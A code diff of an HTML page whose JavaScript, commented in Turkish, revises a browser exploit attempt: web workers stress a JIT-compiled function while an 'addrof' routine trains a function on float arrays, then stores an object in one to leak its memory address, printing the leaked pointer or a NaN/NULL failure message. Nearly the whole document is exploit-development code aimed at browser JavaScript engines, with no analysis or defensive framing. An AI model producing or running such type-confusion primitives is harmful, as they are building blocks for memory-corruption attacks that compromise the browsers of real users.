@@ -2,44 +2,42 @@
 <html><body>
 <h1 id="s">Running...</h1>
 <script>
-var corrupt = false;
-
-// addrof primitive attempt
-function addrof(val) {
-  var o = {x: val};
-  // JIT'i float olarak compile ettir
-  function leak(o) { return o.x; }
-  for(var i = 0; i < 100000; i++) leak({x: 1.1});
-  // Sonra object geçir — type mismatch
-  return leak(o);
-}
-
 var wCode = `
   function jit(o){return o.a+o.b;}
   for(var i=0;i<300000;i++) jit({a:1.1,b:2.2});
-  while(true){
-    jit({a:1.1,b:2.2});
-    jit({a:1,b:2});
-    jit({a:"x",b:"y"});
-  }
+  while(true){jit({a:1.1,b:2.2});jit({a:1,b:2});}
 `;
-var u = URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
+var u=URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
 for(var i=0;i<4;i++) new Worker(u);
 
-// Primitive test
-var target = {secret: 0xdeadbeef};
-try {
-  var leaked = addrof(target);
-  var buf = new ArrayBuffer(8);
-  var view = new DataView(buf);
-  view.setFloat64(0, leaked, true);
-  var lo = view.getUint32(0, true);
-  var hi = view.getUint32(4, true);
+function addrof(val) {
+  var arr = [1.1, 2.2, 3.3];
+  function rd(a) { return a[0]; }
+  for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
+  arr[0] = val;
+  return rd(arr);
+}
+
+var target = {secret: 0x1337};
+var leaked = addrof(target);
+
+var buf = new ArrayBuffer(8);
+var dv = new DataView(buf);
+dv.setFloat64(0, leaked, true);
+var lo = dv.getUint32(0,true);
+var hi = dv.getUint32(4,true);
+
+// NaN kontrolü
+var isNaN_val = (hi === 0x7ff80000 && lo === 0x00000000);
+var isNull = (hi === 0 && lo === 0);
+
+if (isNaN_val) {
+  document.getElementById('s').textContent = 'NaN — type confusion olmadı';
+} else if (isNull) {
+  document.getElementById('s').textContent = 'NULL — başka sorun';
+} else {
   document.getElementById('s').textContent = 
-    'leaked: 0x' + hi.toString(16) + lo.toString(16);
-  corrupt = true;
-} catch(e) {
-  document.getElementById('s').textContent = 'no primitive: ' + e;
+    '✅ ADDROF ÇALIŞTI: 0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
 }
 </script>
 </body></html>
